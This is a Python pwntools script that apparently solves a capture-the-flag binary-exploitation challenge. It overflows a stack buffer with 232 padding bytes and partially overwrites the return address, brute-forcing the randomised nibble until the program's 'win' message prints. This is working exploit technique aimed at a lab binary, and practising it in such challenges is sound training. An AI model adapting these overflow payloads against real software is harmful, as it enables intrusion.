import pwn

# objdump -d /challenge/finalctf_AdvancedOverflow | grep -A20 win => 0000000000001261

""" Uncomment this to get cyclic value """
# pwn.context.terminal = ['tmux', 'splitw', '-h']

# proc = pwn.gdb.debug(["/challenge/finalctf_AdvancedOverflow", pwn.cyclic(9999)])
# proc.send(pwn.cyclic(9999))
# proc.wait()
""""""

CYCLIC_NUM = 232

combos = [0x02, 0x12, 0x22, 0x32, 0x42, 0x52, 0x62, 0x72, 0x82, 0x92, 0xA2, 0xB2, 0xC2, 0xD2, 0xE2, 0xF2]

for _ in range(4096):
    for c in combos:
        payload = b'A'*CYCLIC_NUM + pwn.p8(0x61) + pwn.p8(c)

        proc = pwn.process(["/challenge/finalctf_AdvancedOverflow", payload])
        # 1e offset comes from the instruction right before the second puts call in assembly

        tmp = proc.recvall(.25).decode()

        if "Here is your" in tmp:
            print(tmp)

        proc.wait()
